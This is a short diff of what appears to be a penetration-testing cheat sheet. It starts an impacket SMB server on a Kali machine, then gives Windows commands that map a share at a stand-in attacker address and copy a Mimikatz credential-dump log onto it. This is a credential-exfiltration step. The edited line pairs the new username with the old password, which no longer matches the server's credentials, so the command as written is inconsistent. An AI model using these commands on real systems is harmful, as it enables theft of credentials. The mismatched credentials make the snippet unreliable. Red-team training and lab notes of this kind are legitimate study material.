@@ -24,7 +24,7 @@ impacket-smbserver test . -smb2support  -username ashok -password reddy
 ```
 On Windows:
 ```powershell
-net use m: \\Kali_IP\test /user:kourosh kourosh
+net use m: \\Kali_IP\test /user:ashok kourosh
 copy mimikatz.log m:\
 ```
 2) RDP mounting shared folder:
